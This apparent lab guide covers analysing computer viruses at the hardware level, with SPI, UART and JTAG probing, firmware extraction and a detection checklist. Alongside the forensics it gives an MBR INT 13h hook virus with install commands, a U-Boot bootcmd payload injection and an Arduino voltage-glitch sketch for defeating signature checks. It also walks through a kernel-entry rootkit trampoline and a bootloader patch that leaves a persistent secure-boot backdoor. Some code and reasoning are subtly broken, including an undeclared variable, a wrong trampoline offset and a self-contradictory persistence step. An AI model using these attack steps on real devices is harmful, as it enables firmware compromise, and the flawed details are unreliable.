# Operational Verification Labs: Computer Viruses

## Objective & Lab Bench Setup

The operational verification of computer viruses demands a controlled hardware environment that isolates malicious code execution from production networks while enabling deep signal-level observation of infection vectors, persistence mechanisms, and payload delivery. This laboratory guide constructs a physical testbed using commodity hardware, open-source firmware tools, and low-level instrumentation to dissect virus behavior at the register, bus, and memory level. The practitioner will probe SPI flash chips, capture UART bootloader traffic, extract firmware images, and inject controlled infections into isolated systems while monitoring system state transitions through logic analyzers and hardware debuggers.

The laboratory bench requires a USB logic analyzer (Saleae Logic clone or comparable 8-channel device), a USB-to-UART bridge (FTDI FT232H or CP2102), a JTAG/SWD adapter (ST-Link V2 or J-Link EDU), IC test clips (SOIC-8 for SPI flash), and jumper wires with DuPont connectors. The target hardware consists of obsolete x86 single-board computers or ARM development boards with accessible UART headers and SPI flash chips—deliberately chosen legacy systems where firmware modification poses no operational risk. A Raspberry Pi 4 serves as the analysis workstation, running a minimal Debian installation with the complete diagnostic suite installed via `apt-get install sigrok-cli openocd flashrom binwalk radare2 gdb-multiarch minicom`. The workstation must remain permanently air-gapped from any network infrastructure, with data transfer occurring exclusively through removable USB storage sanitized after each session.

Physical bench layout follows a quarantine protocol: the target device occupies the center workspace on an anti-static mat, surrounded by a perimeter of instrumentation equipment. The logic analyzer connects to SPI bus lines (CLK, MOSI, MISO, CS) via IC clips attached directly to the flash chip pins while the system remains powered off. The UART bridge attaches to the board's serial console header, typically a 3.3V three-pin configuration (TX, RX, GND). The JTAG adapter connects to the processor's debug interface when available, though many consumer devices disable this in production firmware. All ground connections share a common reference point at the target device's ground plane. Power sequencing discipline prevents signal contention: the logic analyzer and UART bridge draw power from the analysis workstation's USB ports before the target device powers on, establishing a stable monitoring baseline prior to execution.

The software environment begins with a sigrok installation verified through device enumeration: `sigrok-cli --scan` must detect the logic analyzer hardware, displaying its channel configuration and maximum sample rate. OpenOCD requires a configuration file matching the target processor architecture—for ARM Cortex-M devices, this specifies the SWD transport and clock frequency; for MIPS-based routers, it declares the EJTAG interface parameters. Flashrom operates in programmer mode, with the FT232H configured as an SPI master through the `ft2232_spi` driver. A baseline verification sequence tests the complete toolchain: attach the FT232H to a spare SPI flash chip, execute `flashrom -p ft2232_spi:type=232H -r baseline.bin` to extract a reference image, then calculate its SHA-256 hash to establish a known-good state. This baseline becomes the control against which all subsequent modifications are compared, enabling precise detection of virus-induced alterations at the byte level.

The target virus specimens reside in a dedicated specimen library, organized by infection vector and payload mechanism. Boot sector viruses targeting MBR structures, UEFI rootkits exploiting firmware vulnerabilities, and embedded malware persisting in SPI flash each demand distinct laboratory procedures. Specimens originate from archived malware repositories, academic research collections, or controlled synthesis following published technical papers—never from active threat intelligence feeds, which introduce unnecessary operational risk. Each specimen undergoes static analysis in radare2 prior to live execution, documenting its entry point, system call sequences, and persistence logic. This preparatory analysis informs the hardware instrumentation strategy: a virus that patches bootloader code requires SPI bus monitoring during early boot, while a memory-resident payload demands JTAG-based RAM inspection after infection completes.

## Exercise 1: Live Hardware Probing & Signal Capture

The first operational exercise establishes baseline signal capture of a clean boot sequence, documenting the SPI flash read patterns, UART bootloader output, and GPIO state transitions that characterize uninfected system initialization. This baseline serves as the reference waveform against which virus-induced anomalies become visible in subsequent exercises. The practitioner physically attaches the logic analyzer to the target device's SPI flash chip while the system remains powered off, carefully identifying pin 1 through the molded dot or notch on the SOIC-8 package. Standard SPI flash pinout follows a consistent pattern: pin 1 carries chip select (CS), pin 2 carries serial output (MISO), pin 3 and pin 7 tie to ground and VCC respectively, pin 5 carries serial input (MOSI), and pin 6 carries the clock signal (CLK). The logic analyzer's ground lead attaches to pin 3, establishing the voltage reference for all subsequent measurements.

Connect four logic analyzer channels to the SPI bus signals: channel 0 to CS (pin 1), channel 1 to MISO (pin 2), channel 2 to MOSI (pin 5), and channel 3 to CLK (pin 6). Configure the logic analyzer sample rate to 24 MHz, providing adequate resolution to capture SPI clock frequencies up to 8 MHz with Nyquist margin. Launch sigrok-cli in continuous capture mode with protocol decoding enabled: `sigrok-cli -d fx2lafw --config samplerate=24M --channels 0-3 --protocol-decoders spi:clk=3:miso=1:mosi=2:cs=0 --protocol-decoder-annotations spi=miso-data,mosi-data --continuous`. This command configures the FX2-based logic analyzer hardware, assigns the four channels to their respective SPI signals, instantiates the built-in SPI protocol decoder, and streams decoded transactions to stdout. The protocol decoder interprets the raw digital waveforms, extracting command bytes and data payloads according to the SPI specification's timing relationships.

With the logic analyzer armed and capturing, apply power to the target device. The first SPI activity appears within milliseconds as the processor's boot ROM reads the first-stage bootloader from flash. The sigrok output stream displays a sequence of SPI read commands, each consisting of a 0x03 opcode (standard read), a 24-bit address, and a variable-length data payload. For a typical embedded Linux system, the initial read bursts fetch U-Boot from offset 0x00000000, followed by device tree blobs and kernel images from higher addresses. Record the complete capture to disk using output redirection: `sigrok-cli -d fx2lafw --config samplerate=24M --channels 0-3 --protocol-decoders spi:clk=3:miso=1:mosi=2:cs=0 --time 30s -o baseline_boot.sr`. This captures thirty seconds of SPI traffic in sigrok's native session format, preserving the raw waveform data alongside decoded protocol annotations.

Simultaneously monitor the UART console to correlate bootloader messages with SPI flash accesses. Connect the USB-to-UART bridge to the target's serial header, observing correct polarity: the bridge's TX pin connects to the target's RX pin, the bridge's RX pin connects to the target's TX pin, and both grounds connect together. Configure minicom for 115200 baud, 8 data bits, no parity, 1 stop bit (8N1): `minicom -D /dev/ttyUSB0 -b 115200`. The bootloader banner appears immediately after power-on, displaying version strings, memory size detection, and boot device enumeration. Cross-reference the UART timestamps with the logic analyzer's SPI decode: when U-Boot prints "Loading kernel from 0x100000", the SPI capture should show a corresponding read burst at that exact flash offset. This correlation validates the instrumentation setup and establishes the temporal relationship between high-level boot messages and low-level bus transactions.

Extract the complete firmware image using flashrom for offline analysis. Power down the target device, leaving the logic analyzer and UART bridge connected. Attach the FTDI FT232H to the SPI flash chip using an SOIC-8 test clip, which mechanically grips the chip's body while making electrical contact with all eight pins. The FT232H operates in SPI master mode, temporarily assuming control of the bus to read the flash contents independently of the target processor. Execute `flashrom -p ft2232_spi:type=232H -r firmware_baseline.bin` to extract the entire flash image, which typically completes in 2-3 minutes for an 8 MB chip at flashrom's default read speed. Verify the extraction integrity by reading the chip a second time and comparing cryptographic hashes: `flashrom -p ft2232_spi:type=232H -r firmware_baseline_verify.bin && sha256sum firmware_baseline.bin firmware_baseline_verify.bin`. Identical hashes confirm bit-perfect extraction with no read errors.

Analyze the extracted firmware image using binwalk to identify embedded filesystems, bootloaders, and compression artifacts. Execute `binwalk -e firmware_baseline.bin` to perform entropy analysis and signature matching, automatically extracting recognized file structures into a subdirectory. The output reveals the firmware's internal layout: bootloader code at offset 0x00000000, compressed kernel at 0x00100000, and SquashFS root filesystem at 0x00300000. Each extracted component undergoes further inspection—use `unsquashfs` to unpack the root filesystem, then examine init scripts, kernel modules, and daemon configurations for baseline system behavior. Document the complete memory map in a laboratory notebook, creating a reference architecture diagram that maps logical addresses to physical flash offsets. This baseline map becomes the forensic foundation for detecting virus-induced modifications: any deviation in subsequent extractions indicates potential infection or persistence mechanism activation.

## Exercise 2: Bus Sniffing, Register Inspection & Memory Dumping

The second exercise introduces controlled virus infection while maintaining continuous hardware-level observation of system state. The objective is to capture the precise moment when malicious code executes, documenting the register modifications, memory writes, and peripheral accesses that constitute the infection process. This requires live debugging through JTAG or SWD interfaces combined with bus-level monitoring, creating a multi-layer instrumentation framework that observes the system simultaneously from the processor's internal state and the external interconnect fabric.

Begin by synthesizing a minimal boot sector virus targeting x86 real-mode execution. The virus occupies the standard 512-byte MBR structure, preserving the partition table in bytes 446-509 and the boot signature 0x55AA at bytes 510-511. The infection payload resides in the first 446 bytes, executing immediately upon BIOS handoff. The following assembly implements a proof-of-concept hook that intercepts INT 13h disk I/O calls:

```nasm
BITS 16
ORG 0x7C00

start:
    cli
    xor ax, ax
    mov ss, ax
    mov sp, 0x7C00
    sti
    
    ; Save original INT 13h vector
    push es
    xor ax, ax
    mov es, ax
    mov ax, [es:0x13*4]
    mov [original_int13_offset], ax
    mov ax, [es:0x13*4+2]
    mov [original_int13_segment], ax
    
    ; Install hook
    mov word [es:0x13*4], int13_hook
    mov word [es:0x13*4+2], cs
    pop es
    
    ; Load original MBR from sector 1
    mov ah, 0x02
    mov al, 0x01
    mov ch, 0x00
    mov cl, 0x02
    mov dh, 0x00
    xor bx, bx
    mov es, bx
    mov bx, 0x7E00
    int 0x13
    jc halt
    
    ; Transfer control to original MBR
    jmp 0x0000:0x7E00

int13_hook:
    pushf
    push bp
    mov bp, sp
    
    ; Inspect command in AH
    cmp ah, 0x02        ; Read sectors?
    je hook_read
    cmp ah, 0x03        ; Write sectors?
    je hook_write
    
hook_passthrough:
    pop bp
    popf
    jmp far [cs:original_int13_offset]

hook_read:
    ; Mark read operation in memory
    push es
    push di
    mov ax, 0xB800
    mov es, ax
    mov di, 0x0000
    mov byte [es:di], 'R'
    mov byte [es:di+1], 0x0C
    pop di
    pop es
    jmp hook_passthrough

hook_write:
    ; Mark write operation in memory
    push es
    push di
    mov ax, 0xB800
    mov es, ax
    mov di, 0x0002
    mov byte [es:di], 'W'
    mov byte [es:di+1], 0x0E
    pop di
    pop es
    jmp hook_passthrough

halt:
    hlt
    jmp halt

original_int13_offset: dw 0x0000
original_int13_segment: dw 0x0000

times 446-($-$$) db 0
; Partition table starts at byte 446
times 64 db 0
; Boot signature
dw 0xAA55
```

Assemble this code using NASM and write it to a USB flash drive's MBR using dd: `nasm -f bin mbr_virus.asm -o mbr_virus.bin && dd if=mbr_virus.bin of=/dev/sdX bs=446 count=1 conv=notrunc`. The `conv=notrunc` flag preserves the existing partition table, installing only the virus code in the bootloader region. Create a controlled infection scenario by booting a legacy x86 test system (an old netbook or Intel Atom board) from this infected USB device. Before powering on, attach a logic analyzer to the system's LPC bus if accessible, or alternatively monitor GPIO lines connected to status LEDs that reflect disk activity. The LPC bus carries the low-level communication between the chipset and peripheral devices, including the disk controller that executes the virus's INT 13h hooks.

For ARM-based targets, the infection vector shifts to U-Boot environment variable manipulation. Many embedded systems parse U-Boot environment variables from SPI flash during early boot, executing commands stored in the `bootcmd` variable. A virus targeting this mechanism modifies the environment block to inject malicious payload execution before the legitimate kernel loads. Extract the environment variables from the baseline firmware image using `strings firmware_baseline.bin | grep -A 5 bootcmd` to locate the default boot command sequence. Typical output resembles: `bootcmd=sf probe 0; sf read 0x82000000 0x100000 0x400000; bootm 0x82000000`. This command chain probes the SPI flash, reads the kernel to RAM address 0x82000000, and boots it. Modify this command to execute a secondary payload first: `bootcmd=sf probe 0; sf read 0x81000000 0x800000 0x10000; go 0x81000000; sf read 0x82000000 0x100000 0x400000; bootm 0x82000000`. The inserted commands read a 64 KB payload from flash offset 0x800000 into RAM and execute it before proceeding to the legitimate kernel.

Inject this modified environment block into a copy of the firmware image using a hex editor. U-Boot environments use CRC32 checksums for integrity validation, so the modification requires recalculating the checksum after editing the command string. Use the `mkenvimage` utility from the U-Boot source tree to regenerate a valid environment block: `mkenvimage -s 0x10000 -o env_infected.bin env_infected.txt`, where `env_infected.txt` contains the modified key-value pairs in plain text format. Splice this environment block back into the firmware image at the correct offset identified during the binwalk analysis in Exercise 1. Write the infected firmware to the target's SPI flash using flashrom: `flashrom -p ft2232_spi:type=232H -w firmware_infected.bin`. This operation overwrites the entire flash contents, replacing the baseline firmware with the trojanized version.

With the infected firmware installed, reconnect the logic analyzer to the SPI bus and the UART bridge to the serial console. Power on the target while simultaneously capturing SPI transactions and bootloader output. The SPI capture reveals the moment when U-Boot reads the environment block from flash—watch for a read burst at the environment offset, followed shortly by reads at the payload offset 0x800000 that did not occur in the baseline capture. The UART output displays the modified `bootcmd` execution: instead of booting directly to the kernel, the system loads and executes the injected payload. If the payload is a simple shell script, it might print diagnostic messages to the console before returning control to the boot sequence. If the payload is compiled ARM code, it executes silently, modifying system state without producing visible output.

To inspect the payload's execution at the instruction level, halt the processor using a JTAG debugger before the payload runs. Connect an ST-Link V2 to the target's SWD header and launch OpenOCD with the appropriate configuration: `openocd -f interface/stlink-v2.cfg -f target/stm32f4x.cfg` for an STM32 target, or substitute the correct target script for other ARM Cortex-A/R/M processors. OpenOCD establishes a GDB remote debugging session on TCP port 3333, enabling connection from gdb-multiarch: `gdb-multiarch -ex "target remote localhost:3333" -ex "monitor reset halt"`. This sequence connects to the target processor and immediately halts execution at the reset vector. Set a hardware breakpoint at the payload's load address: `hbreak *0x81000000` in the GDB command prompt. Resume execution with `continue`, allowing the bootloader to proceed until it jumps to the payload entry point, at which point the hardware breakpoint fires.

Once halted at the payload entry, inspect the processor's register state using `info registers` to dump all general-purpose and special-function registers. For ARM Cortex-A processors, the register file includes R0-R15 (with R13 as stack pointer, R14 as link register, and R15 as program counter), plus the Current Program Status Register (CPSR). Record the initial register values, then single-step through the payload using `stepi`, observing each instruction's effect on registers and memory. Use `x/16wx 0x81000000` to examine the payload's memory contents in hexadecimal, and `disassemble $pc,$pc+64` to disassemble the next several instructions. Document each memory write operation by setting watchpoints: `watch *(uint32_t*)0x40000000` breaks execution whenever the payload writes to that address, revealing the precise instruction responsible for the modification.

Capture the complete memory state after payload execution by dumping RAM to a binary file. In GDB, execute `dump memory ram_infected.bin 0x80000000 0x88000000` to extract the DRAM contents spanning the typical embedded Linux kernel load region. Compare this dump against a baseline memory capture obtained before infection using `cmp -l ram_baseline.bin ram_infected.bin` to identify all modified bytes. Each difference represents a virus-induced state change—whether injected code, modified data structures, or trampolined function pointers. Cross-reference the memory differences with the payload's disassembly to trace causality: a 4-byte difference at address 0x82345678 corresponds to the payload's instruction `str r0, [r1, #0x678]` that overwrote a legitimate data structure.

## Exercise 3: Fault Simulation & Exploit Verification

The third exercise transitions from passive observation to active exploitation, demonstrating how hardware-level faults enable virus persistence and privilege escalation. The practitioner induces controlled glitches in the target system's power supply, clock signal, or flash write timing to corrupt firmware integrity checks, bypass secure boot, or inject code into protected memory regions. This exercise demands precise timing control, often achieved through microcontroller-based glitch injection tools that synchronize fault events with specific instruction cycles or bus transactions.

Construct a voltage glitching apparatus using an Arduino Nano and a high-side MOSFET switch. The Arduino's digital output drives the MOSFET gate, briefly disconnecting the target's VCC rail to induce a voltage sag. The glitch duration and timing are programmable via serial commands, enabling iterative refinement of attack parameters. Connect the MOSFET's source to the bench power supply's positive output, the drain to the target device's VCC pin, and the gate to the Arduino's D9 pin through a 100-ohm resistor. A bypass capacitor (10 µF ceramic) on the target's VCC rail smooths normal operation while allowing rapid voltage collapse during the glitch. The Arduino sketch implements a trigger-wait-glitch sequence:

```cpp
const int GLITCH_PIN = 9;
const int TRIGGER_PIN = 2;

volatile bool trigger_armed = false;
volatile unsigned long trigger_time = 0;

void setup() {
  pinMode(GLITCH_PIN, OUTPUT);
  pinMode(TRIGGER_PIN, INPUT_PULLUP);
  digitalWrite(GLITCH_PIN, HIGH);
  
  attachInterrupt(digitalPinToInterrupt(TRIGGER_PIN), trigger_isr, FALLING);
  
  Serial.begin(115200);
  Serial.println("Glitch controller ready");
}

void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    
    if (cmd.startsWith("ARM")) {
      int delay_us = cmd.substring(4).toInt();
      glitch_delay_us = delay_us;
      trigger_armed = true;
      Serial.println("Armed with delay: " + String(delay_us) + " us");
    }
    else if (cmd.startsWith("GLITCH")) {
      int width_us = cmd.substring(7).toInt();
      glitch_width_us = width_us;
      Serial.println("Glitch width set: " + String(width_us) + " us");
    }
  }
  
  if (trigger_armed && (micros() - trigger_time >= glitch_delay_us)) {
    digitalWrite(GLITCH_PIN, LOW);
    delayMicroseconds(glitch_width_us);
    digitalWrite(GLITCH_PIN, HIGH);
    trigger_armed = false;
    Serial.println("Glitch fired!");
  }
}

void trigger_isr() {
  if (trigger_armed) {
    trigger_time = micros();
  }
}

volatile unsigned int glitch_delay_us = 0;
volatile unsigned int glitch_width_us = 10;
```

Upload this sketch to the Arduino and verify operation by sending commands via the serial monitor: `ARM 1000` arms the glitch with a 1 ms delay after trigger, and `GLITCH 20` sets the glitch width to 20 µs. The trigger input connects to a GPIO line on the target device that transitions during the vulnerability window—for example, a line that goes high when secure boot begins signature verification. Alternatively, use the logic analyzer's pattern trigger output to generate the trigger signal when a specific SPI command byte appears on the bus.

Target a bootloader signature verification routine for glitch-based bypass. Many embedded bootloaders verify a cryptographic signature on the kernel image before booting, rejecting execution if the signature is invalid. The verification typically occurs in a tight loop that reads signature bytes from flash, feeds them into a SHA-256 or RSA verification function, and branches based on the result. A well-timed glitch during the final comparison instruction can corrupt the conditional branch, causing the processor to execute the success path regardless of signature validity. To identify the vulnerability window, first observe the bootloader's behavior with an invalid signature: modify a single byte in the kernel image and reboot, noting the SPI read patterns and UART error messages. The verification failure occurs at a consistent timestamp relative to power-on, establishing the target window for glitch injection.

Instrument the target to generate a hardware trigger at the critical moment. If source code access exists, modify the bootloader to toggle a GPIO pin immediately before the signature comparison: insert `gpio_set_value(DEBUG_PIN, 1)` before the `if (signature_valid) { boot_kernel(); }` conditional. Recompile and flash the modified bootloader, then connect the Arduino's trigger input to the debug GPIO. In the absence of source code, derive the trigger from bus activity: use the logic analyzer to identify a unique SPI read burst that occurs only during signature verification (e.g., reading the signature block from a specific flash offset), and configure sigrok to output a trigger pulse when that pattern occurs. Run `sigrok-cli` with the `--trigger` option to define the pattern and `--continuous` to maintain monitoring across multiple boot cycles.

Execute the glitch attack by arming the Arduino, installing an invalidly signed kernel, and power-cycling the target. The Arduino waits for the trigger signal, then fires the voltage glitch at the programmed delay. The first attempt likely fails—either the glitch occurs too early (before the comparison), too late (after the branch), or with insufficient magnitude (the comparison executes correctly despite the voltage sag). Iterate the glitch parameters systematically: start with a 10 µs glitch width and sweep the delay from 0 to 1000 µs in 10 µs increments. For each parameter set, attempt ten boot cycles and record whether the invalid kernel boots successfully. A successful glitch manifests as the kernel banner appearing on the UART console despite the signature mismatch. Once a working parameter set is found, refine the delay and width for maximum reliability, tightening the ranges until a ±5 µs window consistently bypasses the signature check.

With secure boot defeated, inject a persistent virus payload into the kernel image. The payload resides in an unused section of the kernel binary, activated by a trampoline inserted at the kernel's entry point. Use radare2 to disassemble the kernel and identify the entry point: `r2 -A vmlinux` followed by `s entry0` to seek to the entry, and `pd 10` to disassemble the first ten instructions. Insert a branch to the payload by overwriting the entry's first instruction with a jump: for ARM, replace the first word with `e59ff004` (LDR PC, [PC, #4]) followed by the payload's absolute address. This trampoline loads the payload address into the program counter, transferring control immediately upon kernel startup. The payload itself implements a simple rootkit that hooks the kernel's system call table, redirecting specific syscalls to malicious handlers that execute with kernel privileges.

Verify the infection persistence across reboot cycles without the glitch hardware in place. Write the trojanized kernel back to flash using flashrom, ensuring the signature block remains invalid. Power-cycle the target: without the glitch attack, the bootloader rejects the invalid signature and halts. Re-enable the glitch controller and boot again: the signature bypass succeeds and the kernel boots, but the virus payload does not execute because the signature verification detected the modification. The payload only activates after a second-stage attack that modifies the bootloader itself to permanently disable signature checking. Extract the bootloader binary from flash, locate the signature verification function in radare2, and replace the conditional branch with a NOP sled or unconditional jump to the success path. Write the patched bootloader back to flash, creating a persistent backdoor that accepts any kernel image regardless of signature. Now the virus payload executes on every boot without requiring glitch hardware, demonstrating complete compromise of the secure boot chain.

Document the full attack chain in a forensic timeline, correlating hardware events with software state transitions. The timeline begins with the initial glitch attack at T+0ms, proceeds through bootloader bypass at T+150ms, kernel load at T+300ms, payload execution at T+500ms, and finally rootkit installation at T+800ms when the kernel initializes its syscall table. Each timestamp corresponds to observable bus activity or UART output captured during the attack. Cross-reference the timeline with memory dumps taken at each stage, showing the progressive accumulation of malicious code and modified data structures. This multi-layered analysis provides complete visibility into the virus lifecycle, from initial injection through persistent execution, grounded in physical hardware measurements rather than abstract software logs.

## Hardware Security Checklist & Diagnostic Cheat Sheet

The final section consolidates the laboratory's diagnostic procedures into a rapid-response checklist for virus detection and analysis in field scenarios. Each entry specifies the observable symptom, the corresponding hardware diagnostic technique, and the expected tool output for both clean and infected systems. This checklist enables the practitioner to quickly triage suspicious devices, identify active infections, and prioritize detailed forensic analysis.

**Symptom: Unexpected boot delay or multiple SPI read cycles during early boot.**  
**Diagnostic:** Capture SPI bus activity with logic analyzer during power-on. Compare the read sequence against baseline firmware structure identified via binwalk.  
**Command:** `sigrok-cli -d fx2lafw --config samplerate=24M --channels 0-3 --protocol-decoders spi:clk=3:miso=1:mosi=2:cs=0 --time 10s -o boot_capture.sr`  
**Clean output:** SPI reads follow a linear progression from bootloader offset 0x00000000 to kernel offset 0x00100000 with no repeated or out-of-sequence accesses.  
**Infected output:** Anomalous read bursts at unexpected offsets (e.g., reads from 0x00800000 before kernel load) indicate payload staging. Repeated reads of the same block suggest decryption loops or integrity check failures that a virus might trigger.

**Symptom: Modified bootloader output or missing version strings on UART console.**  
**Diagnostic:** Connect USB-to-UART bridge and capture full boot log. Compare against known-good baseline using diff.  
**Command:** `minicom -D /dev/ttyUSB0 -b 115200 -C boot_log.txt`, then `diff boot_baseline.txt boot_log.txt`  
**Clean output:** Identical bootloader banners, memory detection messages, and device enumeration sequences.  
**Infected output:** Missing or altered strings, unexpected command execution messages (e.g., "Loading payload from 0x800000"), or early kernel panics indicating corrupted boot parameters.

**Symptom: Firmware checksum mismatch or flashrom verification failure.**  
**Diagnostic:** Extract complete flash image and compare cryptographic hash against known-good baseline.  
**Command:** `flashrom -p ft2232_spi:type=232H -r suspicious.bin && sha256sum suspicious.bin baseline.bin`  
**Clean output:** Identical SHA-256 hashes confirm bit-perfect match with baseline.  
**Infected output:** Hash mismatch indicates modified firmware. Use `bindiff suspicious.bin baseline.bin` or radare2's binary diffing to identify changed regions. Offset and size of differences reveal virus injection points.

**Symptom: Persistent behavior changes after firmware reflash.**  
**Diagnostic:** Dump RAM contents via JTAG during runtime and search for known virus signatures or anomalous code patterns.  
**Command:** `gdb-multiarch -ex "target remote localhost:3333" -ex "dump memory ram.bin 0x80000000 0x88000000" -ex "quit"`, then `strings ram.bin | grep -i payload`  
**Clean output:** No suspicious strings, all code regions match disassembled firmware binaries.  
**Infected output:** Presence of unexpected code segments, suspicious strings (e.g., "hook", "inject", "rootkit"), or function pointers redirected to non-firmware addresses.

**Symptom: Glitch-based boot authentication bypass suspected.**  
**Diagnostic:** Instrument power rail with oscilloscope during boot. Monitor for voltage sags coinciding with authentication routines.  
**Command:** Oscilloscope probe on VCC, trigger on voltage drop below 90% nominal. Capture waveform and correlate with UART timestamp of authentication message.  
**Clean output:** Stable supply voltage throughout boot sequence, no correlation between voltage and authentication events.  
**Infected output:** Voltage glitches synchronized with authentication window suggest active hardware attack. Physical inspection may reveal added components (MOSFET, microcontroller) on power traces.

**Symptom: Kernel panic or unexpected system call behavior after boot.**  
**Diagnostic:** Extract kernel binary from flash and disassemble entry point. Verify integrity of initial instructions against upstream source.  
**Command:** `flashrom -p ft2232_spi:type=232H -r dump.bin && binwalk -e dump.bin && r2 -A _dump.bin.extracted/kernel.bin -c "s entry0; pd 20"`  
**Clean output:** Entry point contains standard kernel initialization code, matches checksums from Linux source tree.  
**Infected output:** Entry point overwritten with trampoline (e.g., branch to unusual address), or init code contains suspicious system call interception hooks.

**Symptom: Persistent malware survives complete OS reinstall.**  
**Diagnostic:** Inspect firmware for UEFI or SMM rootkits persisting in SPI flash independent of OS partition.  
**Command:** `flashrom -p internal -r bios.bin && uefi-firmware-parser bios.bin`, then examine DXE driver list for unsigned or anomalous modules.  
**Clean output:** All UEFI modules signed by OEM, no unexpected DXE drivers in firmware volume.  
**Infected output:** Unsigned modules, modified UEFI variables, or System Management Mode (SMM) handlers with suspicious behavior patterns.

**Rapid triage procedure for field deployment:** Connect logic analyzer and UART bridge as per Exercise 1 setup. Power on target while capturing SPI and console output. Immediately compare boot SPI pattern against known-good reference—any deviation (extra reads, altered sequence) triggers full forensic acquisition. Extract firmware via flashrom, compute hash, and if mismatch occurs, transfer device to air-gapped analysis bench for Exercises 2 and 3 procedures. Do not attempt remediation in the field; infected firmware requires complete replacement from trusted source after documenting the infection for threat intelligence. Quarantine the device, preserve all captured waveforms and memory dumps, and photograph the physical hardware for evidence of hardware tampering such as added glitch injection components or reflowed chips indicating firmware reprogramming attempts.

This hardware-centric methodology provides ground-truth verification of virus behavior that pure software analysis cannot achieve. By observing infections at the bus and register level, the practitioner gains definitive proof of malicious activity, circumventing anti-forensics techniques that hide from userspace tools or kernel-level monitors. The laboratory procedures documented here apply equally to sophisticated APT firmware implants and to academic virus research, offering a repeatable experimental framework for dissecting any code that persists below the operating system boundary.
